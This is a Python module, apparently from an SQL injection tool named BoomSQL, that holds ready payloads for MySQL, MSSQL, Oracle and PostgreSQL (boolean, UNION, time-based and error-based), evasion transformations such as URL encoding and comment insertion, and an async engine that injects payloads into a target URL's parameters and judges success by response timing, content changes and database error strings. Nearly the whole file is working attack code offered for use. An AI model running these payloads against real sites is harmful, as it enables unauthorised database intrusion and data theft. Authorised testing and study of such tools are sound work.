"""
Enhanced SQL Injection Engine for BoomSQL
Advanced features for better detection and payload generation
"""

import asyncio
import re
import time
import json
import statistics
from typing import Dict, List, Optional, Any, Tuple
from dataclasses import dataclass
from enum import Enum

from .logger import LoggerMixin
from .fallbacks import aiohttp, ClientSession

@dataclass
class AdvancedDetectionResult:
    """Enhanced detection result with statistical analysis"""
    detected: bool
    confidence: float
    detection_method: str
    evidence: List[str]
    statistical_analysis: Dict[str, Any]
    timing_analysis: Dict[str, Any]
    content_analysis: Dict[str, Any]
    
class StatisticalAnalyzer:
    """Statistical analysis for response patterns"""
    
    def __init__(self):
        self.baseline_times = []
        self.response_times = []
        self.baseline_lengths = []
        self.response_lengths = []
        
    def add_baseline_sample(self, response_time: float, content_length: int):
        """Add baseline measurement"""
        self.baseline_times.append(response_time)
        self.baseline_lengths.append(content_length)
        
    def add_response_sample(self, response_time: float, content_length: int):
        """Add test response measurement"""
        self.response_times.append(response_time)
        self.response_lengths.append(content_length)
        
    def analyze_timing_anomaly(self, response_time: float, confidence_threshold: float = 0.95) -> Dict[str, Any]:
        """Analyze timing anomalies using statistical methods"""
        if len(self.baseline_times) < 5:
            return {"detected": False, "reason": "insufficient_baseline"}
            
        # Calculate baseline statistics
        baseline_mean = statistics.mean(self.baseline_times)
        baseline_stdev = statistics.stdev(self.baseline_times) if len(self.baseline_times) > 1 else 0
        
        # Z-score calculation
        if baseline_stdev > 0:
            z_score = (response_time - baseline_mean) / baseline_stdev
        else:
            z_score = 0
            
        # Check for significant delay
        delay_threshold = baseline_mean + (2 * baseline_stdev)
        is_delayed = response_time > delay_threshold
        
        # Calculate confidence
        confidence = min(abs(z_score) / 3.0, 1.0)  # Normalize to 0-1
        
        return {
            "detected": is_delayed and confidence >= confidence_threshold,
            "confidence": confidence,
            "z_score": z_score,
            "baseline_mean": baseline_mean,
            "baseline_stdev": baseline_stdev,
            "response_time": response_time,
            "delay_threshold": delay_threshold,
            "is_delayed": is_delayed
        }
        
    def analyze_content_anomaly(self, content: str, baseline_content: str) -> Dict[str, Any]:
        """Analyze content anomalies"""
        # Length comparison
        length_diff = abs(len(content) - len(baseline_content))
        length_ratio = length_diff / len(baseline_content) if baseline_content else 0
        
        # Similarity analysis
        similarity = self._calculate_similarity(content, baseline_content)
        
        # Pattern analysis
        patterns = self._analyze_patterns(content)
        
        return {
            "length_difference": length_diff,
            "length_ratio": length_ratio,
            "similarity": similarity,
            "patterns": patterns,
            "detected": length_ratio > 0.1 or similarity < 0.8
        }
        
    def _calculate_similarity(self, text1: str, text2: str) -> float:
        """Calculate text similarity using simple algorithm"""
        if not text1 or not text2:
            return 0.0
            
        # Simple character-based similarity
        common_chars = set(text1) & set(text2)
        total_chars = set(text1) | set(text2)
        
        if not total_chars:
            return 1.0
            
        return len(common_chars) / len(total_chars)
        
    def _analyze_patterns(self, content: str) -> Dict[str, Any]:
        """Analyze content for suspicious patterns"""
        patterns = {
            "error_indicators": len(re.findall(r'\b(error|exception|warning|fail)\b', content, re.IGNORECASE)),
            "sql_keywords": len(re.findall(r'\b(select|insert|update|delete|union|from|where)\b', content, re.IGNORECASE)),
            "database_indicators": len(re.findall(r'\b(mysql|mssql|oracle|postgresql|sqlite)\b', content, re.IGNORECASE)),
            "version_strings": len(re.findall(r'\d+\.\d+\.\d+', content)),
            "stack_traces": len(re.findall(r'at\s+\w+\.\w+\(', content)),
            "html_tags": len(re.findall(r'<[^>]+>', content))
        }
        
        return patterns

class AdvancedPayloadGenerator:
    """Advanced payload generation with ML-inspired optimization"""
    
    def __init__(self):
        self.success_patterns = []
        self.failure_patterns = []
        self.context_patterns = {}
        
    def generate_adaptive_payloads(self, target_info: Dict[str, Any], 
                                 previous_results: List[Dict[str, Any]]) -> List[str]:
        """Generate adaptive payloads based on previous results"""
        base_payloads = self._get_base_payloads(target_info)
        
        # Analyze previous results
        successful_patterns = [r for r in previous_results if r.get('success', False)]
        failed_patterns = [r for r in previous_results if not r.get('success', False)]
        
        # Generate variations based on successful patterns
        adaptive_payloads = []
        
        for payload in base_payloads:
            # Apply successful transformations
            for success in successful_patterns:
                if 'transformation' in success:
                    transformed = self._apply_transformation(payload, success['transformation'])
                    adaptive_payloads.append(transformed)
                    
            # Avoid failed patterns
            if not any(self._matches_failed_pattern(payload, fail) for fail in failed_patterns):
                adaptive_payloads.append(payload)
                
        return adaptive_payloads
        
    def _get_base_payloads(self, target_info: Dict[str, Any]) -> List[str]:
        """Get base payloads for the target"""
        database_type = target_info.get('database_type', 'generic')
        
        payloads = {
            'mysql': [
                "' OR 1=1 -- ",
                "' UNION SELECT 1,2,3,4,5,6,7,8,9,10 -- ",
                "' AND (SELECT * FROM (SELECT(SLEEP(5)))GDiu) -- ",
                "' AND ExtractValue(1, concat(0x7e, (SELECT version()), 0x7e)) -- ",
                "' AND UpdateXML(1, concat(0x7e, (SELECT user()), 0x7e), 1) -- "
            ],
            'mssql': [
                "' OR 1=1 -- ",
                "' UNION SELECT 1,2,3,4,5,6,7,8,9,10 -- ",
                "'; WAITFOR DELAY '0:0:5' -- ",
                "' AND CONVERT(INT, (SELECT @@version)) -- ",
                "' AND CAST((SELECT @@version) AS INT) -- "
            ],
            'oracle': [
                "' OR 1=1 -- ",
                "' UNION SELECT 1,2,3,4,5,6,7,8,9,10 FROM dual -- ",
                "' AND (SELECT CASE WHEN (1=1) THEN 'a'||CHR(124)||'b' ELSE NULL END FROM dual) IS NOT NULL -- ",
                "' AND UTL_INADDR.get_host_name((SELECT banner FROM v$version WHERE rownum=1)) IS NULL -- "
            ],
            'postgresql': [
                "' OR 1=1 -- ",
                "' UNION SELECT 1,2,3,4,5,6,7,8,9,10 -- ",
                "'; SELECT pg_sleep(5) -- ",
                "' AND CAST((SELECT version()) AS INT) -- ",
                "' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END) -- "
            ],
            'generic': [
                "' OR '1'='1",
                "' OR 1=1 -- ",
                "' UNION SELECT null,null,null,null,null,null,null,null,null,null -- ",
                "' AND 1=1 -- ",
                "' AND 1=2 -- "
            ]
        }
        
        return payloads.get(database_type, payloads['generic'])
        
    def _apply_transformation(self, payload: str, transformation: Dict[str, Any]) -> str:
        """Apply transformation to payload"""
        if transformation.get('type') == 'case_change':
            return payload.upper() if transformation.get('case') == 'upper' else payload.lower()
        elif transformation.get('type') == 'encoding':
            import urllib.parse
            return urllib.parse.quote(payload)
        elif transformation.get('type') == 'comment_injection':
            return payload.replace(' ', '/**/ ')
        
        return payload
        
    def _matches_failed_pattern(self, payload: str, failed_pattern: Dict[str, Any]) -> bool:
        """Check if payload matches a failed pattern"""
        # Simple pattern matching - can be enhanced
        return failed_pattern.get('pattern', '') in payload

class EnhancedSQLInjectionEngine(LoggerMixin):
    """Enhanced SQL injection engine with advanced detection methods"""
    
    def __init__(self, config: Dict[str, Any]):
        self.config = config
        self.session = None
        self.analyzer = StatisticalAnalyzer()
        self.payload_generator = AdvancedPayloadGenerator()
        
        # Initialize session
        self.init_session()
        
    def init_session(self):
        """Initialize HTTP session"""
        timeout = self.config.get("RequestTimeout", 30)
        self.session = ClientSession(
            timeout=aiohttp.ClientTimeout(total=timeout),
            connector=aiohttp.TCPConnector(limit=10)
        )
        
    async def advanced_detection(self, url: str, parameter: str, 
                               baseline_responses: List[Dict[str, Any]]) -> AdvancedDetectionResult:
        """Advanced detection with multiple methods"""
        
        # Generate adaptive payloads
        target_info = {'database_type': 'generic'}  # Could be enhanced with fingerprinting
        payloads = self.payload_generator.generate_adaptive_payloads(target_info, [])
        
        detection_results = []
        
        for payload in payloads[:5]:  # Test top 5 payloads
            result = await self._test_payload_advanced(url, parameter, payload, baseline_responses)
            detection_results.append(result)
            
        # Combine results
        combined_result = self._combine_detection_results(detection_results)
        
        return combined_result
        
    async def _test_payload_advanced(self, url: str, parameter: str, payload: str, 
                                   baseline_responses: List[Dict[str, Any]]) -> Dict[str, Any]:
        """Test payload with advanced analysis"""
        
        # Modify URL with payload
        modified_url = self._inject_payload(url, parameter, payload)
        
        try:
            start_time = time.time()
            
            async with self.session.get(modified_url) as response:
                content = await response.text()
                response_time = time.time() - start_time
                
                # Statistical analysis
                timing_analysis = self.analyzer.analyze_timing_anomaly(response_time)
                
                # Content analysis
                baseline_content = baseline_responses[0]['content'] if baseline_responses else ""
                content_analysis = self.analyzer.analyze_content_anomaly(content, baseline_content)
                
                # Error pattern analysis
                error_patterns = self._analyze_error_patterns(content)
                
                return {
                    'payload': payload,
                    'response_time': response_time,
                    'status_code': response.status,
                    'content_length': len(content),
                    'timing_analysis': timing_analysis,
                    'content_analysis': content_analysis,
                    'error_patterns': error_patterns,
                    'detected': timing_analysis['detected'] or content_analysis['detected'] or error_patterns['detected']
                }
                
        except Exception as e:
            self.log_error(f"Error testing payload: {e}")
            return {
                'payload': payload,
                'error': str(e),
                'detected': False
            }
            
    def _inject_payload(self, url: str, parameter: str, payload: str) -> str:
        """Inject payload into URL parameter"""
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
        
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        # Inject payload into specified parameter
        params[parameter] = [payload]
        
        # Reconstruct URL
        new_query = urlencode(params, doseq=True)
        modified_url = urlunparse((
            parsed.scheme, parsed.netloc, parsed.path,
            parsed.params, new_query, parsed.fragment
        ))
        
        return modified_url
        
    def _analyze_error_patterns(self, content: str) -> Dict[str, Any]:
        """Analyze content for error patterns"""
        error_patterns = {
            'mysql': [
                r'You have an error in your SQL syntax',
                r'mysql_fetch_array\(\)',
                r'mysql_num_rows\(\)',
                r'Warning: mysql_'
            ],
            'mssql': [
                r'Microsoft OLE DB Provider for SQL Server',
                r'Unclosed quotation mark after',
                r'Microsoft SQL Server',
                r'SQLSTATE'
            ],
            'oracle': [
                r'ORA-\d+:',
                r'Oracle error',
                r'Oracle driver',
                r'OCI\.dll'
            ],
            'postgresql': [
                r'PostgreSQL query failed',
                r'pg_query\(\)',
                r'Warning: pg_',
                r'postgresql'
            ]
        }
        
        detected_patterns = []
        database_type = 'unknown'
        
        for db_type, patterns in error_patterns.items():
            for pattern in patterns:
                if re.search(pattern, content, re.IGNORECASE):
                    detected_patterns.append({
                        'pattern': pattern,
                        'database': db_type,
                        'matches': len(re.findall(pattern, content, re.IGNORECASE))
                    })
                    database_type = db_type
                    
        return {
            'detected': len(detected_patterns) > 0,
            'patterns': detected_patterns,
            'database_type': database_type,
            'confidence': min(len(detected_patterns) / 3.0, 1.0)
        }
        
    def _combine_detection_results(self, results: List[Dict[str, Any]]) -> AdvancedDetectionResult:
        """Combine multiple detection results"""
        
        # Count detections
        detections = [r for r in results if r.get('detected', False)]
        
        # Calculate overall confidence
        if detections:
            confidence = sum(r.get('timing_analysis', {}).get('confidence', 0) for r in detections) / len(detections)
        else:
            confidence = 0.0
            
        # Determine primary detection method
        detection_method = 'none'
        if detections:
            if any(r.get('timing_analysis', {}).get('detected', False) for r in detections):
                detection_method = 'timing'
            elif any(r.get('content_analysis', {}).get('detected', False) for r in detections):
                detection_method = 'content'
            elif any(r.get('error_patterns', {}).get('detected', False) for r in detections):
                detection_method = 'error'
                
        # Collect evidence
        evidence = []
        for result in detections:
            if result.get('payload'):
                evidence.append(f"Payload: {result['payload']}")
            if result.get('error_patterns', {}).get('patterns'):
                evidence.extend([f"Error pattern: {p['pattern']}" for p in result['error_patterns']['patterns']])
                
        return AdvancedDetectionResult(
            detected=len(detections) > 0,
            confidence=confidence,
            detection_method=detection_method,
            evidence=evidence,
            statistical_analysis={'total_tests': len(results), 'detections': len(detections)},
            timing_analysis={'results': [r.get('timing_analysis', {}) for r in results]},
            content_analysis={'results': [r.get('content_analysis', {}) for r in results]}
        )

    async def close(self):
        """Close the session"""
        if self.session:
            await self.session.close()